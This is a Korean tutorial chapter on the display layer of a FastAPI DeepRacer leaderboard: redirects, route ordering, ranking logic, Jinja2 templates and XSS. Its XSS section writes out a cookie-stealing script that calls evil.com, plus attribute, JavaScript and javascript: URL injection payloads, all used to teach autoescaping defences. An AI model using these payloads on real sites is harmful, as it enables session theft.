# 5단계. 조회와 표현 — `routers/leaderboard.py`, `records.py`, `templates/`

> 이 단계의 목표: **데이터를 화면으로 바꾸는 과정**을 이해하는 것.
> 라우팅 순서, 리다이렉트 설계, 정렬 알고리즘, 템플릿 엔진, 그리고 **XSS**.

---

## 0. 서버 렌더링(SSR) vs SPA — 왜 이 선택인가

### 무엇을(What)

**[쉬움]**

| 방식 | 비유 |
|---|---|
| **서버 렌더링 (이 프로젝트)** | 식당에서 **완성된 요리**를 받는다. 접시째 나온다 |
| **SPA (React 등)** | **재료와 레시피**를 받아서 손님이 직접 조리한다 |

**[전공]**

```
SSR:  브라우저 → GET /leaderboard/1 → 서버가 HTML 완성 → 브라우저는 그리기만
SPA:  브라우저 → GET / → 빈 HTML + JS 번들
                → JS 실행 → GET /api/leaderboard/1 (JSON) → JS가 DOM 조립
```

| | SSR | SPA |
|---|---|---|
| 초기 로딩 | 빠름 (HTML 하나) | 느림 (JS 번들 다운로드+파싱) |
| 이후 상호작용 | 페이지 새로고침 | 부분 갱신, 부드러움 |
| 검색엔진 노출 | 그대로 됨 | 별도 처리 필요 |
| 복잡도 | **낮음. 언어 하나** | 프론트/백 두 프로젝트, API 설계, 상태 관리 |
| JS 없이 | 동작함 | 아무것도 안 보임 |

### 왜 이 프로젝트는 SSR인가

`plan.md`에서 확정된 사항이다. 이유:
1. **화면이 5개뿐이다** (리더보드, 시즌목록, 로그인, 제출, 관리자)
2. **상호작용이 거의 없다.** 폼 제출과 링크 이동뿐
3. **개발자가 1명이다.** 프론트/백 분리는 그 자체로 비용
4. 실시간 갱신 요구가 없다 (spec에서 "새로고침으로 확인" 확정)

**만약 SPA로 했다면**: FastAPI에 JSON API를 만들고, React 프로젝트를 따로 만들고,
빌드 파이프라인을 붙이고, CORS를 설정하고, 인증을 토큰 방식으로 바꾸고…
**기능은 똑같은데 파일이 5배가 된다.**

> **[전공] 판단 기준**: "이 화면이 사용자와 초당 여러 번 상호작용하는가?"
> 아니면 SSR로 충분하다. 대시보드, 게시판, 관리 도구는 대부분 SSR이 맞다.
> HTMX는 그 중간 지점을 노린 도구다(plan에 언급되어 있으나 현재 코드는 순수 SSR).

---

## 1. 진입점 설계 — 리다이렉트 체인

```python
@router.get("/")
def index():
    return RedirectResponse("/leaderboard", status_code=303)


@router.get("/leaderboard")
def leaderboard_entry(request: Request, db: Session = Depends(get_db)):
    open_season = get_open_season(db)
    if open_season is not None:
        return RedirectResponse(f"/leaderboard/{open_season.id}", status_code=303)
    return render_season_list(request, db)


@router.get("/leaderboard/seasons")     # ← 순서 주의
def season_list(request: Request, db: Session = Depends(get_db)):
    return render_season_list(request, db)


@router.get("/leaderboard/{season_id}")
def season_leaderboard(season_id: int, request: Request, db: Session = Depends(get_db)):
    ...
```

### 흐름

```
GET /
 └→ 303 → GET /leaderboard
            ├─ 진행중 시즌 있음 → 303 → GET /leaderboard/3  → 리더보드 표시
            └─ 없음 → 시즌 목록 표시 (리다이렉트 없이 직접 렌더)
```

### 왜 이렇게 설계했나

주석에 이유가 있다:
```python
"""대회 기간에는 매번 시즌을 고르지 않아도 되게, 진행중 시즌으로 바로 들어간다.
진행중 시즌이 없으면(전부 준비중/마감/아카이브) 지금까지처럼 시즌 목록을 보여준다."""
```

**[쉬움]** 대회 기간에는 참가자가 링크를 열면 **바로 지금 대회 순위**가 보여야 한다.
"시즌을 고르세요" 화면이 한 번 끼면 짜증난다.

**[전공] 이 설계의 트레이드오프**

**장점**: 홍보 링크가 `/leaderboard` 하나로 고정된다. 시즌이 바뀌어도 링크를 안 바꿔도 된다.

**단점 1 — 왕복이 늘어난다.**
`/` 접속 시 HTTP 요청이 3번(`/` → `/leaderboard` → `/leaderboard/3`).
로컬에선 무시할 수준이지만, Cloudflare Tunnel을 거치면 각 왕복이 수십~수백 ms다.
→ `/`에서 바로 최종 URL로 보내도록 합칠 수 있다.

**단점 2 — 브라우저 히스토리에 중간 URL이 남지 않는다** (303은 히스토리를 대체하지 않음).
"뒤로가기"가 예상대로 동작하는지 확인해볼 가치가 있다.

**단점 3 — 진행중 시즌이 여러 개면?**
```python
def get_open_season(db: Session) -> Season | None:
    """지금 열려있는(진행중) 시즌. 운영상 한 번에 하나지만, 실수로 둘이 되어도
    화면이 흔들리지 않도록 가장 최근 시작한 시즌으로 결정한다."""
    return db.execute(
        select(Season).where(Season.status == SeasonStatus.ACTIVE)
        .order_by(Season.start_date.desc()).limit(1)
    ).scalar_one_or_none()
```

**`.limit(1)` + `scalar_one_or_none()` 조합에 주목.**
`limit(1)`이 없으면 2건일 때 `scalar_one_or_none()`이 예외를 던진다 → **리더보드 전체가 500**.
`limit(1)`을 붙여 **"관리 실수가 있어도 화면은 뜬다"** 를 보장한다.

> **4단계의 `has_active_submission`과 정반대 판단이라는 점이 흥미롭다.**
> - `has_active_submission`: 2건이면 **터뜨린다** (불변식 위반이므로 알아야 함)
> - `get_open_season`: 2건이어도 **하나를 고른다** (공개 화면이 죽으면 안 됨)
>
> **같은 상황에서도 "누가 보는 화면인가"에 따라 실패 전략이 달라진다.**
> 이건 감이 아니라 판단이다: **내부 불변식은 시끄럽게, 공개 화면은 조용하게.**

### 라우트 순서 — 다시 한 번

```python
# 주의: `/leaderboard/{season_id}`보다 먼저 선언해야 한다. FastAPI는 선언 순서로
# 매칭하므로 뒤에 두면 "seasons"를 int로 파싱하려다 422가 난다.
```

**Starlette의 매칭 알고리즘**: `app.routes`를 **순서대로 순회**하며 첫 매칭을 쓴다.
경로 패턴의 "구체성"을 계산하지 않는다.

`/leaderboard/{season_id}` 가 먼저면:
```
GET /leaderboard/seasons
 → /leaderboard/{season_id} 패턴 매칭 성공, season_id = "seasons"
 → int로 변환 시도 → 실패
 → 422 Unprocessable Entity
```

**왜 404가 아니라 422인가?** 라우트는 **찾았고**, 파라미터 검증에서 실패했기 때문이다.
`/leaderboard/abc` 도 마찬가지로 422다.

> **프레임워크별 차이**: Django/Rails/Express는 대체로 선언 순서.
> Next.js App Router나 일부 프레임워크는 정적 세그먼트를 우선한다.
> **"내가 쓰는 프레임워크는 어떤가"를 확인하는 습관이 중요하다.**

**더 나은 대안**: 애초에 충돌하지 않게 설계한다.
```
/leaderboard/season/{id}   과   /leaderboard/seasons
```
또는 `/seasons` 를 최상위로. **순서 의존성은 리팩터링 때 깨지기 쉽다.**

---

## 2. `records.py` — 최고기록 알고리즘

```python
def get_team_best(team: Team) -> tuple[Submission | None, "EvaluationResult | None"]:
    best_submission: Submission | None = None
    best_result = None

    for submission in team.submissions:
        if submission.status != SubmissionStatus.DONE or submission.result is None:
            continue
        result = submission.result
        if result.finish_status != FinishStatus.FINISHED:
            continue

        is_better = best_result is None or (
            result.lap_time_seconds < best_result.lap_time_seconds
            or (
                result.lap_time_seconds == best_result.lap_time_seconds
                and submission.submitted_at < best_submission.submitted_at
            )
        )
        if is_better:
            best_submission = submission
            best_result = result

    return best_submission, best_result
```

### 무엇을(What)

**[쉬움]**
한 팀의 모든 기록을 훑으며 **가장 빠른 것 하나**를 고른다.
똑같이 빠른 게 둘이면 **먼저 세운 쪽**을 고른다.

**[전공]**
선형 스캔 O(n) 최솟값 찾기. 필터 3개 후 비교.

### 필터 3단계 — 각각 왜 필요한가

```python
if submission.status != SubmissionStatus.DONE:  # 1
    continue
if submission.result is None:                    # 2
    continue
if result.finish_status != FinishStatus.FINISHED:# 3
    continue
```

1. **`DONE`이 아닌 것 제외**: `queued`/`running`은 아직 결과가 없고, `error`는 유효하지 않다
2. **`result is None` 제외**: `DONE`인데 결과가 없는 건 이론상 불가능하지만 **방어**.
   워커가 `DONE`으로 바꾸는 것과 `EvaluationResult`를 INSERT하는 건 같은 트랜잭션이라
   원자적이지만, 데이터가 손상되면 여기서 조용히 건너뛴다
3. **미완주(`TIMEOUT`) 제외**: 3바퀴를 못 돈 기록은 랩타임이 `None`이다.
   **이걸 빼먹으면 `None < 3.5` 비교에서 `TypeError`가 난다** — 리더보드 전체가 500

> **`lap_time_seconds`가 `nullable=True`인 이유가 여기 있다.**
> 미완주는 랩타임이 존재하지 않는다. 0으로 채우면 **0초 기록이 1등**이 된다.
> `None`이 의미상 정확하고, 대신 **읽는 쪽이 반드시 걸러야 한다.**

### 동점 처리 — 왜 "먼저 세운 쪽"인가

```python
result.lap_time_seconds == best_result.lap_time_seconds
and submission.submitted_at < best_submission.submitted_at
```

**[쉬움]** 똑같이 10.00초면, **먼저 해낸 팀**이 위. 스포츠의 일반적 관례다.

**[전공]**
`plan.md §5.2`에서 확정된 규칙. 만약 이 조건이 없다면
**순회 순서에 따라 결과가 달라진다** — 같은 데이터로 새로고침할 때마다 순위가 흔들릴 수 있다.

**결정론(determinism)이 중요한 이유**: 참가자가 "아까는 우리가 3등이었는데?"라고 하면 답이 없다.
**정렬은 항상 전순서(total order)여야 한다.**

**부동소수점 함정**: `lap_time_seconds`는 `float`이다.
```python
result.lap_time_seconds == best_result.lap_time_seconds
```
**정확히 같은 float가 나올 확률은?** 랩타임은 `total_ms / 1000.0`로 계산된다:
```python
# worker/drfc.py:239-240
total_ms = sum(t["elapsed_time_in_milliseconds"] for t in completed[:required_laps])
return "finished", total_ms / 1000.0, off_track_total
```
`total_ms`는 **정수**다. 정수를 1000으로 나눈 값이므로,
같은 정수 밀리초면 정확히 같은 float가 나온다. **`==` 비교가 안전하다.**

**하지만 일반적으로는 위험한 패턴이다.** `0.1 + 0.2 != 0.3`.
여기서는 **입력이 정수 밀리초라는 사실**이 안전을 보장한다.
> 더 안전하게 하려면 랩타임을 **정수 밀리초로 저장**하고 표시할 때만 나눈다.
> 금액 계산에서 정수 '원' 단위를 쓰는 것과 같은 원리.

### 이 함수가 두 곳에서 재사용되는 것

```python
# app/routers/leaderboard.py:24
best_submission, best_result = get_team_best(team)

# app/retention.py:59
best_submission, _ = get_team_best(team)
```

**리더보드 표시**와 **파일 보존 정책**이 같은 함수를 쓴다.

**이게 왜 중요한가?**
만약 두 곳이 각자 "최고기록"을 계산했다면, 규칙이 어긋나는 순간
**리더보드에 표시되는 영상 파일이 삭제되는 버그**가 난다.
`records.py`의 docstring이 정확히 그 의도를 밝힌다:
> 팀의 '최고기록'을 계산하는 공용 로직 — 리더보드 조회와 시즌 아카이브에서 함께 쓴다.

**단일 진실 공급원(single source of truth)** 의 실전 예시다.

---

## 3. `build_leaderboard` — 정렬과 분류

```python
def build_leaderboard(db: Session, season: Season):
    teams = db.execute(
        select(Team).where(Team.season_id == season.id, Team.disqualified.is_(False))
    ).scalars().all()

    ranked = []
    unranked = []

    for team in teams:
        best_submission, best_result = get_team_best(team)
        total_submissions = sum(1 for s in team.submissions if s.status == SubmissionStatus.DONE)

        if best_result is not None:
            video_url = f"/media/videos/{best_result.video_path}" if best_result.video_path else None
            ranked.append({
                "team": team,
                "lap_time": best_result.lap_time_seconds,
                "achieved_at": best_submission.submitted_at,
                "total_submissions": total_submissions,
                "video_url": video_url,
            })
        else:
            unranked.append({"team": team, "total_submissions": total_submissions})

    ranked.sort(key=lambda row: (row["lap_time"], row["achieved_at"]))
    return ranked, unranked
```

### 3-1. `Team.disqualified.is_(False)` — `== False`가 아닌 이유

**[전공]**
SQLAlchemy에서 `Team.disqualified == False` 는 파이썬 린터가 경고한다(`E712`).
그리고 `NULL` 처리가 다르다:

```sql
WHERE disqualified = false   -- NULL인 행은 제외됨 (NULL = false는 NULL, 즉 참이 아님)
WHERE disqualified IS false  -- 명시적
```

`.is_(False)` → `IS false` 를 생성한다. 의도가 명확하다.
`disqualified`는 `NOT NULL`이라 실질 차이는 없지만 **관례적으로 옳은 표현**이다.

**참고**: `.is_(None)` 은 `IS NULL`을 만든다. `== None`은 SQLAlchemy가 알아서 변환하지만
`.is_(None)`이 명시적이다.

### 3-2. **실격팀은 리더보드에서 "조용히 사라진다"**

`WHERE ... disqualified = false` 로 **아예 조회하지 않는다.**

spec 확정 사항:
> 실격/부정 제출은 리더보드에서 조용히 사라지고 사유 비공개

**[전공] 설계 관점**
- 실격 사유를 공개하면 분쟁이 생긴다
- "실격됨"이라고 표시하면 그것 자체가 낙인이다
- 데이터는 남기고 **표시만 안 한다** (soft hide)

**단, 실격팀도 로그인해서 `/submit`에는 갈 수 있다.** 그때는 명확히 알려준다:
```python
if team.disqualified:
    return redirect_with_error("실격 처리된 팀은 제출할 수 없습니다.")
```
**공개 화면에서는 숨기고, 당사자에게는 알린다.** 정확한 처리다.

### 3-3. `ranked` / `unranked` 분리

**왜 나누나?**

미완주 팀은 랩타임이 없어 **정렬할 수 없다.** 억지로 넣으면:
- `None`을 정렬하면 `TypeError`
- 999초 같은 값을 넣으면 "999초 기록"으로 오해받는다
- 맨 아래에 넣어도 "순위 15등"이라는 숫자가 붙는다

`leaderboard.html`에서 별도 테이블로 렌더한다:
```jinja
{% if unranked %}
<h2>미완주</h2>
<table>
  <thead><tr><th>팀</th><th>제출 횟수</th></tr></thead>
```
**순위 컬럼이 없다.** 정확한 UI 결정이다.

### 3-4. **튜플 정렬 키 — 파이썬의 사전식 비교**

```python
ranked.sort(key=lambda row: (row["lap_time"], row["achieved_at"]))
```

**[쉬움]**
사전에서 단어를 찾듯이, **첫 글자를 먼저 보고, 같으면 둘째 글자**를 본다.
여기선 "랩타임 먼저, 같으면 달성 시각".

**[전공]**
튜플 비교는 **요소별로 왼쪽부터** 비교한다. 첫 요소가 같을 때만 다음으로 넘어간다.
```python
(10.5, t1) < (10.5, t2)   →  10.5 == 10.5 이므로  t1 < t2 를 비교
(10.4, t1) < (10.5, t2)   →  10.4 < 10.5 로 끝. t는 안 봄
```

**`sort()`는 안정 정렬(stable sort)이다** — Timsort.
같은 키를 가진 원소의 **원래 순서가 보존**된다.
그런데 여기선 튜플 두 번째 요소로 이미 전순서를 만들었으므로 안정성에 의존하지 않는다.
**의존하지 않는 게 좋다** — 나중에 정렬 방식을 바꿔도 결과가 안 변한다.

**내림차순이 필요하면?**
```python
ranked.sort(key=lambda r: (r["lap_time"], r["achieved_at"]))              # 둘 다 오름차순
ranked.sort(key=lambda r: (-r["lap_time"], r["achieved_at"]))             # 첫째만 내림차순
ranked.sort(key=lambda r: (r["lap_time"], r["achieved_at"]), reverse=True) # 둘 다 내림차순
```
**혼합 방향이 필요하면 `-` 를 쓰거나 여러 번 정렬한다**(안정 정렬을 이용).

### 3-5. `total_submissions` — 무엇을 세는가

```python
total_submissions = sum(1 for s in team.submissions if s.status == SubmissionStatus.DONE)
```

주석:
```python
# 평가가 실제로 끝난 제출만 센다 — 업로드 오류나 시스템 오류(ERROR)는
# 팀의 시도로 보기 어렵고, 하루 제출 한도 카운트 기준과도 일치한다.
```

**하루 한도 카운트 기준(`quota.py`)과 일치시킨 것이 핵심이다.**
```python
Submission.status == SubmissionStatus.DONE   # quota.py 도 같은 조건
```

**만약 어긋난다면?** 참가자가 "리더보드엔 3회로 나오는데 왜 오늘 2회밖에 못 쓰지?"
→ 신뢰가 깨진다. **같은 개념은 같은 규칙으로.**

**[전공] `sum(1 for ...)` vs `len([... ])`**
- `sum(1 for ...)`: 제너레이터. 리스트를 안 만든다 → 메모리 절약
- `len([x for x in ... if ...])`: 리스트를 만들고 길이를 잼

수십 건 규모에선 차이 없지만 **제너레이터가 관용적**이다.

### 3-6. `video_url` 조립

```python
video_url = f"/media/videos/{best_result.video_path}" if best_result.video_path else None
```

`video_path`는 상대 경로다: `"1/6/17.mp4"` (`{season}/{team}/{submission}.mp4`)
→ `/media/videos/1/6/17.mp4`
→ `main.py`의 `app.mount("/media/videos", StaticFiles(directory=settings.videos_dir))`가 처리
→ 실제 파일 `storage/videos/1/6/17.mp4`

**`video_path`가 `None`일 수 있는 두 경우:**
1. 워커가 쓸 만한 영상 앵글을 못 찾음 (`drfc.download_video`가 `None` 반환)
2. **보존 정책으로 파일을 지우면서 경로를 비웠다**
```python
# app/retention.py:47-48
if _remove(videos_dir / result.video_path):
    removed += 1
result.video_path = None      # ← 파일을 지웠으니 경로도 비운다
```

**이게 왜 중요한가?** 파일은 지웠는데 경로만 남으면 **깨진 링크**가 된다.
사용자는 "보기"를 눌렀는데 404를 본다. `retention.py` 주석이 정확히 지적한다:
> 영상은 지운 뒤 `video_path`를 비운다 — 파일이 없는데 경로만 남으면 나중에 깨진 링크가 된다.

템플릿에서:
```jinja
<td>{% if row.video_url %}<a href="{{ row.video_url }}" target="_blank">보기</a>{% else %}—{% endif %}</td>
```

### 3-7. **왜 SQL이 아니라 파이썬에서 계산하는가**

현재: 팀을 전부 가져와서 파이썬 루프로 최고기록을 찾고 정렬한다.

**SQL로 하면:**
```sql
SELECT DISTINCT ON (t.id) t.id, t.name, r.lap_time_seconds, s.submitted_at
FROM teams t
JOIN submissions s ON s.team_id = t.id AND s.status = 'done'
JOIN evaluation_results r ON r.submission_id = s.id AND r.finish_status = 'finished'
WHERE t.season_id = :sid AND NOT t.disqualified
ORDER BY t.id, r.lap_time_seconds ASC, s.submitted_at ASC;
```
(그리고 이걸 다시 랩타임으로 정렬)

| | 파이썬 (현재) | SQL |
|---|---|---|
| 쿼리 수 | N+1 (수십~수백) | 1 |
| 데이터 전송 | 전체 제출 레코드 | 팀당 1행 |
| 가독성 | **높음.** 규칙이 파이썬으로 읽힘 | 낮음. window function 필요 |
| 테스트 | **쉬움.** `get_team_best`는 순수 함수 | DB 필요 |
| 재사용 | **쉬움.** retention.py와 공유 | 어려움 |
| 규칙 변경 | 쉬움 | SQL 재작성 |

**`plan.md §4`의 판단**: "규모(시즌당 약 10팀)가 작아 별도 캐시 테이블 없이 즉시 계산한다"

**이 판단이 옳은 이유**: 최적화의 정석은 **"측정 없이 최적화하지 마라"**.
팀 10개 × 제출 70건 = 700행. 로컬 PostgreSQL에서 수십 ms.
**가독성과 재사용성이 압도적으로 이긴다.**

**언제 SQL로 바꿔야 하나?**
- 팀이 수백~수천이 될 때
- 리더보드가 초당 수십 번 조회될 때
- **먼저 `selectinload`로 N+1만 없애도 대부분 해결된다** (2단계 참고)

---

## 4. Jinja2 템플릿 — HTML을 만드는 방법

### 4-1. `TemplateResponse` 호출 방식 (2.0 스타일)

```python
return templates.TemplateResponse(
    request,                                    # ← 첫 인자가 request
    "leaderboard.html",
    {"season": season, "ranked": ranked, "unranked": unranked},
)
```

**옛 방식(deprecated)**:
```python
templates.TemplateResponse("leaderboard.html", {"request": request, "season": season, ...})
```
컨텍스트 dict 안에 `request`를 넣어야 했다. **까먹으면 런타임 에러.**

새 방식은 `request`를 첫 위치 인자로 받아 명시적이다.
`render.py`가 `Jinja2Templates` 인스턴스를 한 곳에서 만들어 공유한다:
```python
# app/render.py
templates = Jinja2Templates(directory="app/templates")
```
**왜 모듈로 분리?** 4개 라우터가 각자 `Jinja2Templates(...)`를 만들면
템플릿 캐시가 4벌 생기고, 설정(필터 추가 등)을 바꿀 때 4곳을 고쳐야 한다.

### 4-2. 템플릿 상속

`base.html`:
```jinja
<title>{% block title %}SPG DeepRacer{% endblock %}</title>
...
<main>
  {% block content %}{% endblock %}
</main>
```

`leaderboard.html`:
```jinja
{% extends "base.html" %}
{% block title %}{{ season.name }} 리더보드{% endblock %}
{% block content %}
<h1>{{ season.name }} 리더보드</h1>
...
{% endblock %}
```

**[쉬움]** 액자(base)는 하나 만들어두고, 그림(content)만 갈아 끼운다.

**[전공]**
- 헤더/네비게이션/CSS 링크가 한 곳에만 존재 → 바꿀 때 한 곳만
- `{% block %}`은 자식이 안 채우면 부모의 기본값을 쓴다
- **동작 원리**: Jinja는 `extends`를 만나면 자식을 먼저 파싱해 블록 맵을 만들고,
  부모를 렌더하면서 블록 자리에 자식 것을 끼운다. **부모가 바깥, 자식이 안쪽**

`base.html`의 네비게이션:
```jinja
<a href="/leaderboard">리더보드</a>
<a href="/submit">모델 제출</a>
<a href="/admin">관리자</a>
```
**로그인 여부와 무관하게 항상 같은 링크가 보인다.**
비로그인 상태로 `/submit`을 누르면 `get_current_team`이 `/login`으로 보낸다.
→ **동작은 하지만, 관리자 링크가 모두에게 보이는 건 정보 노출**이다.
`get_current_team_optional`을 써서 조건부로 보여줄 수도 있다(현재 미사용 코드).

### 4-3. **자동 이스케이프와 XSS — 이 단계의 핵심 보안 주제**

#### 공격 시나리오

관리자가 팀을 등록할 때 팀명을 이렇게 넣으면?
```
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

이스케이프가 없다면 렌더 결과:
```html
<td><script>fetch('https://evil.com/?c='+document.cookie)</script></td>
```
→ **리더보드를 여는 모든 사람의 브라우저에서 스크립트가 실행된다.**
→ 관리자가 열면 관리자 세션 쿠키가 탈취된다 (**Stored XSS** — 가장 위험한 유형)

#### Jinja2의 방어

`Jinja2Templates`는 `autoescape=True`가 기본이다.
```jinja
{{ row.team.name }}
```
→ 렌더 시 다음 5개 문자를 HTML 엔티티로 변환:

| 원본 | 변환 |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&#34;` |
| `'` | `&#39;` |

결과:
```html
<td>&lt;script&gt;fetch(...)&lt;/script&gt;</td>
```
→ 브라우저는 이걸 **텍스트로 표시**한다. 실행 안 된다. 화면에 `<script>...`라는 글자가 보일 뿐.

#### **이스케이프를 무력화하는 방법 (절대 하지 말 것)**

```jinja
{{ user_input | safe }}          ← 이스케이프 끄기
{% autoescape false %}...{% endautoescape %}
```
파이썬 쪽:
```python
from markupsafe import Markup
Markup(user_input)               ← "이건 안전한 HTML이야"라고 거짓말
```

**현재 코드에 `|safe`가 하나도 없다.** 좋은 상태다.

> **원칙: `|safe`를 쓰고 싶으면 그 데이터가 어디서 왔는지 끝까지 추적하라.**
> 사용자 입력이 조금이라도 섞이면 안 된다.

#### **자동 이스케이프가 막지 못하는 곳 — 반드시 알 것**

**HTML 텍스트 노드는 안전하지만, 다른 문맥은 안전하지 않다:**

```jinja
<!-- 1. 속성값 — 따옴표가 없으면 위험 -->
<div class={{ x }}>              ← x = "a onmouseover=alert(1)" 이면 뚫림
<div class="{{ x }}">            ← 따옴표가 있으면 " 가 이스케이프되어 안전

<!-- 2. JavaScript 안 — 완전히 다른 문맥 -->
<script>var name = "{{ x }}";</script>
   ← x = "; alert(1); //  이면 뚫림. HTML 이스케이프는 JS 문자열을 보호하지 않는다

<!-- 3. URL 안 — 스킴 검증이 필요 -->
<a href="{{ url }}">             ← url = "javascript:alert(1)" 이면 클릭 시 실행

<!-- 4. CSS 안 -->
<style>body { background: {{ x }} }</style>
```

**우리 코드는 어떤가?**

```jinja
<!-- leaderboard.html -->
<td>{{ row.team.name }}</td>                          ✅ 텍스트 노드
<a href="{{ row.video_url }}" target="_blank">         ⚠️ URL 문맥
<td class="{{ 'rank-1' if loop.index==1 else ... }}">  ✅ 서버가 만든 고정 문자열
```

**`href="{{ row.video_url }}"` 는 위험한가?**
```python
video_url = f"/media/videos/{best_result.video_path}"
```
`video_path`는 워커가 만든다:
```python
video_rel_path = f"{season_id}/{team_id}/{submission.id}.mp4"
```
**전부 DB의 정수 ID로 조립된다. 사용자 입력이 안 들어간다.** → 안전하다.

**하지만 이건 "우연히 안전"에 가깝다.** 만약 나중에 파일명을 사용자 입력에서 가져오면
`javascript:` 스킴 주입이 가능해진다. **URL을 템플릿에 넣을 때는 항상 스킴을 확인하는 습관**이 필요하다.

**`target="_blank"` 의 부수적 문제**: `rel="noopener noreferrer"` 가 없다.
새 창이 `window.opener`로 원래 창을 조작할 수 있는 **탭내빙(tabnabbing)** 취약점.
현대 브라우저는 `_blank`에 암묵적으로 `noopener`를 적용하지만, **명시하는 게 안전하다.**
(우리 링크는 같은 출처의 mp4라 실제 위험은 없다)

### 4-4. 템플릿 문법 정독

```jinja
{% for row in ranked %}
<tr>
  <td class="{{ 'rank-1' if loop.index==1 else ('rank-2' if loop.index==2 else ('rank-3' if loop.index==3 else '')) }}">{{ loop.index }}</td>
  <td>{{ row.team.name }}</td>
  <td>{{ "%.2f"|format(row.lap_time) }}초</td>
  <td>{{ row.total_submissions }}</td>
  <td>{% if row.video_url %}<a href="{{ row.video_url }}" target="_blank">보기</a>{% else %}—{% endif %}</td>
</tr>
{% endfor %}
```

**`loop.index`**: Jinja의 특수 변수. **1부터 시작**한다(`loop.index0`은 0부터).
`ranked`가 이미 정렬되어 있으므로 이게 곧 순위다.

**`{{ "%.2f"|format(row.lap_time) }}`**: 파이썬 `%` 포매팅을 필터로.
`10.5` → `"10.50"`. **소수점 둘째 자리 고정** — 표가 정렬되어 보인다.

**`row.team.name`**: Jinja는 dict의 `row["team"]`도 `row.team`으로 접근할 수 있다.
`ranked`의 원소가 dict인데 점 표기가 되는 이유다.
(Jinja는 먼저 속성을 찾고, 없으면 `__getitem__`을 시도한다)

### 4-5. **순위 표시의 버그 — 동점자 처리**

```jinja
<td>{{ loop.index }}</td>
```

**동점이 나오면 어떻게 되나?**

랩타임 10.00초 팀이 둘이면:
```
1위  팀A  10.00초
2위  팀B  10.00초    ← 같은 기록인데 순위가 다르다
3위  팀C  11.20초
```

**스포츠 관례(standard competition ranking)로는:**
```
1위  팀A  10.00초
1위  팀B  10.00초
3위  팀C  11.20초    ← 2위는 건너뛴다
```

**현재 구현은 `achieved_at`으로 내부 순서를 정하므로 결과가 흔들리진 않는다.**
그래도 **"같은 기록인데 순위가 다른"** 화면이 나온다. 참가자 입장에서는 납득이 안 된다.

**개선 방법:**
```python
# build_leaderboard 마지막에 순위를 계산해 넣는다
rank = 0
prev_time = None
for i, row in enumerate(ranked, start=1):
    if row["lap_time"] != prev_time:
        rank = i
        prev_time = row["lap_time"]
    row["rank"] = rank
```
```jinja
<td>{{ row.rank }}</td>
```

> **이건 실제 개선 여지로 기록할 만하다.** 밀리초 단위라 동점 확률이 낮지만,
> **대회에서 실제로 발생하면 분쟁이 된다.**

### 4-6. 빈 상태 처리

```jinja
{% if not ranked and not unranked %}
<p class="muted">아직 제출된 기록이 없습니다.</p>
{% endif %}
```

**[전공] 빈 상태(empty state)는 UI의 기본 요소다.**
표만 덩그러니 있고 아무 행도 없으면 "고장난 건가?" 싶다.
시즌 시작 직후에는 **이 화면이 대부분의 사람이 처음 보는 화면**이다.

---

## 5. 자가 점검 질문

1. SSR과 SPA의 차이는? 이 프로젝트가 SSR인 이유 3가지는?
2. `/` → `/leaderboard` → `/leaderboard/3` 리다이렉트 체인의 장점과 비용은?
3. `get_open_season`이 `.limit(1)`을 쓰는 이유는? `has_active_submission`은 왜 다른 판단을 하는가?
4. 라우트 선언 순서가 잘못되면 왜 404가 아니라 422가 나는가?
5. `get_team_best`의 필터 3개는 각각 무엇을 막는가? 3번을 빼면 어떤 예외가 나는가?
6. 랩타임 `float` 를 `==` 로 비교하는 게 왜 여기선 안전한가? 일반적으로는 왜 위험한가?
7. `get_team_best`가 리더보드와 retention에서 공유되지 않으면 어떤 버그가 생기는가?
8. `.is_(False)` 와 `== False`의 차이는?
9. 실격팀이 리더보드에서 사라지는 방식과, 당사자에게 알리는 방식의 차이는?
10. `ranked`와 `unranked`를 나누는 이유는? 합치면 어떤 문제가?
11. 튜플 정렬 키가 동작하는 원리는? 첫 요소만 내림차순으로 하려면?
12. `total_submissions`가 `DONE`만 세는 이유는? quota와 어긋나면 무슨 일이?
13. `video_path`를 `None`으로 만드는 두 상황은? 안 비우면 무슨 문제가?
14. 팀명에 `<script>`를 넣으면 무슨 일이 일어나는가? 무엇이 막아주는가?
15. 자동 이스케이프가 막지 못하는 4가지 문맥은?
16. `href="{{ row.video_url }}"`가 지금은 안전한 이유는? 언제 위험해지는가?
17. 동점자 순위 표시에 어떤 문제가 있는가? 어떻게 고치는가?

---

## 6. 실험 과제

**실험 A — XSS 방어 확인**
관리자로 팀을 등록하되 이름을 `<b>굵게</b>` 로 준다.
리더보드에서 굵게 보이는가, 태그가 글자로 보이는가?
그다음 템플릿을 `{{ row.team.name | safe }}` 로 바꾸고 다시 본다.
**차이를 눈으로 확인한 뒤 반드시 되돌린다.**

**실험 B — 동점 상황 만들기**
DB에서 두 팀의 `lap_time_seconds`를 같은 값으로 직접 UPDATE하고 리더보드를 본다.
```sql
UPDATE evaluation_results SET lap_time_seconds = 12.34 WHERE id IN (1, 2);
```
순위가 1, 2로 나오는가? `achieved_at` 순서대로인가? (테스트 DB에서만)

**실험 C — 미완주 필터 제거**
`records.py`의 `if result.finish_status != FinishStatus.FINISHED: continue` 를 주석 처리하고
미완주 기록이 있는 시즌의 리더보드를 열어보라. 어떤 예외가 나는가?
`lap_time_seconds`가 `None`인 것과 어떻게 연결되는가?

**실험 D — N+1 재확인 + 해결**
```python
# app/db.py
engine = create_engine(settings.database_url, pool_pre_ping=True, future=True, echo=True)
```
리더보드를 열고 콘솔의 SELECT 개수를 센다. 그다음:
```python
from sqlalchemy.orm import selectinload
from app.models import Submission

teams = db.execute(
    select(Team).where(Team.season_id == season.id, Team.disqualified.is_(False))
    .options(selectinload(Team.submissions).selectinload(Submission.result))
).scalars().all()
```
다시 세어본다. **몇 개에서 몇 개로 줄었는가?**

**실험 E — 순위 계산 개선 구현**
§4-5의 동점 순위 계산을 실제로 구현하고,
`tests/test_leaderboard_ranking.py`를 읽은 뒤 동점 케이스 테스트를 추가하라.
```bash
PYTHONPATH=. .venv/bin/python -m pytest tests/test_leaderboard_ranking.py -v
```

**실험 F — 템플릿 상속 이해**
`base.html`에 `{% block extra_head %}{% endblock %}`을 추가하고,
`leaderboard.html`에서만 `<meta http-equiv="refresh" content="60">`를 넣어보라.
리더보드만 자동 새로고침되는지 확인.

---

→ 다음: [06-worker.md](06-worker.md) — 웹과 완전히 분리된 세계, 그리고 동시성
